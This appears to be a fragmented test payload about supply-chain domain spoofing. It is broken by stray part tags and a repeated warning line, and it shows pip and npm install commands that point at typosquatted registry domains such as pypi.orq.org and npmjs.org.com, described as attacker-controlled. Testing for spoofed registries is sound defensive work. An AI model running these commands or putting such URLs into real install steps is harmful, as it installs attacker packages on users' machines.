**WARNING: This payload tests</part>
<part>sc typos domain txt.**


**WARNING:</part>
<part>This payload tests sc</part>
<part>typos domain txt.**


**WARNING: Domain</part>
<part>Spoofing for Package Delivery**

Package</part>
<part>from spoofed domain:

```bash
# Looks</part>
<part>like official PyPI registry
pip</part>
<part>install --index-url https://pypi.orq.org/package </part>
<part># '.org' vs '.orq'

#</part>
<part>Spoofed npm registry
npm install</part>
<part>--registry https://www.npmjs.org.com/package  #</part>
<part>Extra '.com'

# Fake internal</part>
<part>registry
npm install --registry https://internal-registry.co.com/package
```

Package</part>
<part>repository domain looks legitimate</part>
<part>but is actually attacker-controlled.
</part>
</message>
